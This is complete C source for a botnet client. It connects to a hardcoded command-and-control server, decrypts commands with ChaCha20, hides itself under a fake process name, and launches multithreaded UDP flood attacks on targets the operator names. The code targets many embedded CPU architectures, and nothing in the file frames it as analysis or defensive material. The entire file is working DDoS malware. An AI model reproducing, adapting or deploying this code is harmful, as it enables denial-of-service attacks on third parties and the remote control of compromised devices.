#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <ctype.h>

// ==================== CONFIG ====================
#define CNC_IP "169.58.160.60"
#define CNC_PORT 999
#define BOT_AUTH_KEY "Reactserverbot"
#define HIDE_NAME "@_00"

// ==================== CHACHA20 KEY (32 bytes) ====================
static const uint8_t CRYPTO_KEY[32] = "Reactservertg";  // 13 bytes + zeros

// ==================== UDP ATTACK CONFIG ====================
#define MAX_CONCURRENT_ATTACKS 10
#define BATCH_SIZE 512
#define PKT_SIZE 1024
#define SNDBUF_SIZE (64 * 1024 * 1024)
#define SLEEP_US 50

// ==================== CHACHA20 IMPLEMENTATION ====================
#define CHACHA20_KEY_SIZE 32
#define CHACHA20_NONCE_SIZE 12
#define CHACHA20_BLOCK_SIZE 64

typedef struct {
    uint32_t state[16];
} chacha20_ctx;

static inline uint32_t rotl32(uint32_t x, int n) {
    return (x << n) | (x >> (32 - n));
}
static inline uint32_t load32le(const uint8_t *p) {
    return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);
}
static inline void store32le(uint8_t *p, uint32_t x) {
    p[0] = x & 0xff;
    p[1] = (x >> 8) & 0xff;
    p[2] = (x >> 16) & 0xff;
    p[3] = (x >> 24) & 0xff;
}

static void chacha20_init(chacha20_ctx *ctx, const uint8_t *key, const uint8_t *nonce) {
    ctx->state[0] = 0x61707865;
    ctx->state[1] = 0x3320646e;
    ctx->state[2] = 0x79622d32;
    ctx->state[3] = 0x6b206574;
    ctx->state[4] = load32le(key + 0);
    ctx->state[5] = load32le(key + 4);
    ctx->state[6] = load32le(key + 8);
    ctx->state[7] = load32le(key + 12);
    ctx->state[8] = load32le(key + 16);
    ctx->state[9] = load32le(key + 20);
    ctx->state[10] = load32le(key + 24);
    ctx->state[11] = load32le(key + 28);
    ctx->state[12] = 0;
    ctx->state[13] = load32le(nonce + 0);
    ctx->state[14] = load32le(nonce + 4);
    ctx->state[15] = load32le(nonce + 8);
}

static void chacha20_block(chacha20_ctx *ctx, uint8_t *out) {
    uint32_t x[16], i;
    memcpy(x, ctx->state, sizeof(x));
    for (i = 0; i < 10; i++) {
        x[0] += x[4]; x[12] = rotl32(x[12] ^ x[0], 16);
        x[1] += x[5]; x[13] = rotl32(x[13] ^ x[1], 16);
        x[2] += x[6]; x[14] = rotl32(x[14] ^ x[2], 16);
        x[3] += x[7]; x[15] = rotl32(x[15] ^ x[3], 16);
        x[0] += x[4]; x[12] = rotl32(x[12] ^ x[0], 12);
        x[1] += x[5]; x[13] = rotl32(x[13] ^ x[1], 12);
        x[2] += x[6]; x[14] = rotl32(x[14] ^ x[2], 12);
        x[3] += x[7]; x[15] = rotl32(x[15] ^ x[3], 12);
        x[8] += x[12]; x[4] = rotl32(x[4] ^ x[8], 8);
        x[9] += x[13]; x[5] = rotl32(x[5] ^ x[9], 8);
        x[10] += x[14]; x[6] = rotl32(x[6] ^ x[10], 8);
        x[11] += x[15]; x[7] = rotl32(x[7] ^ x[11], 8);
        x[8] += x[12]; x[4] = rotl32(x[4] ^ x[8], 7);
        x[9] += x[13]; x[5] = rotl32(x[5] ^ x[9], 7);
        x[10] += x[14]; x[6] = rotl32(x[6] ^ x[10], 7);
        x[11] += x[15]; x[7] = rotl32(x[7] ^ x[11], 7);
    }
    for (i = 0; i < 16; i++) {
        store32le(out + 4 * i, x[i] + ctx->state[i]);
    }
    ctx->state[12]++;
}

static void chacha20_decrypt(chacha20_ctx *ctx, const uint8_t *in, uint8_t *out, size_t len) {
    uint8_t block[CHACHA20_BLOCK_SIZE];
    size_t i;
    while (len > 0) {
        chacha20_block(ctx, block);
        for (i = 0; i < len && i < CHACHA20_BLOCK_SIZE; i++) {
            out[i] = in[i] ^ block[i];
        }
        in += i;
        out += i;
        len -= i;
    }
}

// ==================== ARCHITECTURE ====================
static inline const char* get_arch() {
#ifdef __x86_64__
    return "x86_64";
#elif defined(__i386__)
    return "i486";
#elif defined(__aarch64__)
    return "aarch64";
#elif defined(__arm__)
    return "armv7l";
#elif defined(__armv6l__)
    return "armv6l";
#elif defined(__armv5l__)
    return "armv5l";
#elif defined(__armv4l__)
    return "armv4l";
#elif defined(__mips__)
    #ifdef __MIPSEL__
        return "mipsel";
    #else
        return "mips";
    #endif
#elif defined(__mips64__)
    return "mips";
#elif defined(__powerpc__)
    return "powerpc";
#elif defined(__sparc__)
    return "sparc";
#elif defined(__sh4__)
    return "sh4";
#elif defined(__m68k__)
    return "m68k";
#elif defined(__arc__)
    return "arc";
#else
    return "unknown";
#endif
}

// ==================== RNG ====================
static __thread unsigned int rng_state;
static inline unsigned int get_rand(void) {
    rng_state ^= rng_state << 13;
    rng_state ^= rng_state >> 17;
    rng_state ^= rng_state << 5;
    return rng_state;
}

// ==================== DAEMONIZE ====================
void daemonize(int argc, char **argv) {
    srand(time(NULL));
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    if (setsid() < 0) exit(1);
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    size_t shlen = strlen(HIDE_NAME);
    memset(argv[0], 0, strlen(argv[0]));
    memcpy(argv[0], HIDE_NAME, shlen);
    prctl(PR_SET_NAME, (unsigned long)HIDE_NAME, 0, 0, 0);
}

// ==================== ATTACK STRUCTURES ====================
typedef struct {
    char target[32];
    int port;
    int duration;
    int attack_id;
    int is_active;
    unsigned long long packets_sent;
    pthread_t thread;
} AttackInfo;

static AttackInfo attacks[MAX_CONCURRENT_ATTACKS];
static int attack_count = 0;
static pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;

// ==================== UDP ATTACK WORKER ====================
void* udp_attack_worker(void *arg) {
    AttackInfo *info = (AttackInfo*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock < 0) return NULL;
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    int sndbuf = SNDBUF_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf, sizeof(sndbuf));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(info->port);
    inet_pton(AF_INET, info->target, &addr.sin_addr);
    struct mmsghdr *msgs = malloc(BATCH_SIZE * sizeof(struct mmsghdr));
    struct iovec *iovs = malloc(BATCH_SIZE * sizeof(struct iovec));
    unsigned char **packets = malloc(BATCH_SIZE * sizeof(unsigned char*));
    if (!msgs || !iovs || !packets) {
        close(sock);
        return NULL;
    }
    int pkt_len = PKT_SIZE;
    const char* game = "\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65";
    int game_len = strlen(game);
    for (int i = 0; i < BATCH_SIZE; i++) {
        packets[i] = malloc(pkt_len);
        if (!packets[i]) {
            close(sock);
            return NULL;
        }
        iovs[i].iov_base = packets[i];
        iovs[i].iov_len = pkt_len;
        msgs[i].msg_hdr.msg_name = &addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(addr);
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
    }
    time_t end = time(NULL) + info->duration;
    info->packets_sent = 0;
    while (info->is_active && time(NULL) < end) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            for (int j = 0; j < pkt_len; j++) {
                packets[i][j] = (unsigned char)get_rand();
            }
            if (pkt_len >= game_len) {
                memcpy(packets[i], game, game_len);
            }
        }
        int ret = sendmmsg(sock, msgs, BATCH_SIZE, MSG_DONTWAIT | MSG_NOSIGNAL);
        if (ret > 0) {
            info->packets_sent += ret;
        }
        usleep(SLEEP_US);
    }
    for (int i = 0; i < BATCH_SIZE; i++) free(packets[i]);
    free(packets); free(msgs); free(iovs);
    close(sock);
    info->is_active = 0;
    return NULL;
}

int start_attack(const char *target, int port, int duration) {
    pthread_mutex_lock(&attack_mutex);
    int slot = -1;
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
        if (!attacks[i].is_active) {
            slot = i;
            break;
        }
    }
    if (slot == -1) {
        pthread_mutex_unlock(&attack_mutex);
        return -1;
    }
    AttackInfo *info = &attacks[slot];
    strcpy(info->target, target);
    info->port = port;
    info->duration = duration;
    info->attack_id = (int)time(NULL) + slot;
    info->is_active = 1;
    info->packets_sent = 0;
    if (pthread_create(&info->thread, NULL, udp_attack_worker, info) != 0) {
        info->is_active = 0;
        pthread_mutex_unlock(&attack_mutex);
        return -2;
    }
    pthread_detach(info->thread);
    attack_count++;
    pthread_mutex_unlock(&attack_mutex);
    return slot;
}

void stop_attack(int attack_id) {
    pthread_mutex_lock(&attack_mutex);
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
        if (attacks[i].is_active && attacks[i].attack_id == attack_id) {
            attacks[i].is_active = 0;
            attack_count--;
            break;
        }
    }
    pthread_mutex_unlock(&attack_mutex);
}

void stop_all_attacks() {
    pthread_mutex_lock(&attack_mutex);
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
        if (attacks[i].is_active) {
            attacks[i].is_active = 0;
            attack_count--;
        }
    }
    pthread_mutex_unlock(&attack_mutex);
}

void get_status(char *buffer, size_t bufsize) {
    pthread_mutex_lock(&attack_mutex);
    int len = snprintf(buffer, bufsize, "max=10 active=%d/10\n", attack_count);
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
        if (attacks[i].is_active) {
            AttackInfo *a = &attacks[i];
            len += snprintf(buffer + len, bufsize - len,
                "  [%d] %s:%d duration=%d packets=%llu\n",
                i, a->target, a->port, a->duration, a->packets_sent);
        }
    }
    pthread_mutex_unlock(&attack_mutex);
}

// ==================== GLOBALS ====================
static volatile int running = 1;
static int cnc_socket = -1;
static char arch[32] = "unknown";
static char group[64] = "default";
static uint32_t bot_nonce_counter = 0;

// ==================== COMMAND HANDLER ====================
static void handle_command(const char *cmd, int sock) {
    if (!cmd || !*cmd) return;
    if (strncmp(cmd, "stop", 4) == 0) {
        stop_all_attacks();
        send(sock, "stopped", 7, MSG_NOSIGNAL);
        return;
    }
    if (strncmp(cmd, "!kill", 5) == 0) {
        stop_all_attacks();
        running = 0;
        send(sock, "killed", 6, MSG_NOSIGNAL);
        return;
    }
    if (strncmp(cmd, "ping", 4) == 0) {
        char response[512];
        get_status(response, sizeof(response));
        send(sock, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    if (strncmp(cmd, "stop_attack", 11) == 0) {
        int attack_id;
        sscanf(cmd, "%*s %d", &attack_id);
        stop_attack(attack_id);
        send(sock, "attack_stopped", 14, MSG_NOSIGNAL);
        return;
    }
    if (strncmp(cmd, "!udpplain", 9) == 0 ||
        strncmp(cmd, "!syn", 4) == 0 ||
        strncmp(cmd, "!igmp", 5) == 0 ||
        strncmp(cmd, "!ack", 4) == 0 ||
        strncmp(cmd, "!udpbypass", 10) == 0) {
        char ip[32], port[8], time_str[12];
        sscanf(cmd, "%*s %31s %7s %11s", ip, port, time_str);
        int result = start_attack(ip, atoi(port), atoi(time_str));
        char response[64];
        if (result >= 0) {
            snprintf(response, sizeof(response), "attack_started id=%d slot=%d", 
                     attacks[result].attack_id, result);
        } else if (result == -1) {
            snprintf(response, sizeof(response), "error max_attacks_reached (max=10)");
        } else {
            snprintf(response, sizeof(response), "error failed_to_start");
        }
        send(sock, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    if (strncmp(cmd, "!udp", 4) == 0) {
        char ip[32], port[8], time_str[12];
        sscanf(cmd, "%*s %31s %7s %11s", ip, port, time_str);
        int result = start_attack(ip, atoi(port), atoi(time_str));
        char response[64];
        if (result >= 0) {
            snprintf(response, sizeof(response), "attack_started id=%d slot=%d", 
                     attacks[result].attack_id, result);
        } else if (result == -1) {
            snprintf(response, sizeof(response), "error max_attacks_reached (max=10)");
        } else {
            snprintf(response, sizeof(response), "error failed_to_start");
        }
        send(sock, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    if (strncmp(cmd, "status", 6) == 0) {
        char response[1024];
        get_status(response, sizeof(response));
        send(sock, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    send(sock, "ack", 3, MSG_NOSIGNAL);
}

// ==================== CNC CONNECTION ====================
void cnc_loop(void) {
    struct sockaddr_in addr;
    int reconnect_delay = 5;
    int max_reconnect_delay = 60;
    memset(attacks, 0, sizeof(attacks));

    while (running) {
        cnc_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (cnc_socket < 0) {
            sleep(reconnect_delay);
            continue;
        }

        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        setsockopt(cnc_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(cnc_socket, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        addr.sin_family = AF_INET;
        addr.sin_port = htons(CNC_PORT);
        if (inet_pton(AF_INET, CNC_IP, &addr.sin_addr) <= 0) {
            close(cnc_socket);
            sleep(reconnect_delay);
            continue;
        }

        if (connect(cnc_socket, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            close(cnc_socket);
            sleep(reconnect_delay);
            continue;
        }

        reconnect_delay = 5;

        // Send authentication – NO extra parameters
        char auth[128];
        snprintf(auth, sizeof(auth), "%s:%s %s", BOT_AUTH_KEY, arch, group);
        send(cnc_socket, auth, strlen(auth), 0);

        // Main receive loop
        while (running) {
            uint8_t encrypted[600];
            ssize_t n = recv(cnc_socket, encrypted, sizeof(encrypted)-1, 0);
            if (n <= 0) break;
            if (n < 12) continue;

            uint8_t *nonce = encrypted;
            uint8_t *ciphertext = encrypted + 12;
            size_t ciphertext_len = n - 12;

            uint8_t decrypted[512];
            chacha20_ctx tmp_ctx;
            chacha20_init(&tmp_ctx, CRYPTO_KEY, nonce);
            chacha20_decrypt(&tmp_ctx, ciphertext, decrypted, ciphertext_len);
            decrypted[ciphertext_len] = 0;

            handle_command((const char *)decrypted, cnc_socket);
        }

        close(cnc_socket);
        if (reconnect_delay < max_reconnect_delay) {
            reconnect_delay += 2;
        }
        sleep(reconnect_delay);
    }
}

// ==================== MAIN ====================
int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    daemonize(argc, argv);

    const char *arch_str = get_arch();
    strcpy(arch, arch_str);

    if (argc > 1) {
        strncpy(group, argv[1], sizeof(group)-1);
        group[sizeof(group)-1] = 0;
    } else {
        strcpy(group, "default");
    }

    int null_fd = open("/dev/null", O_RDWR);
    if (null_fd > 0) {
        dup2(null_fd, STDOUT_FILENO);
        dup2(null_fd, STDERR_FILENO);
        close(null_fd);
    }

    cnc_loop();
    return 0;
}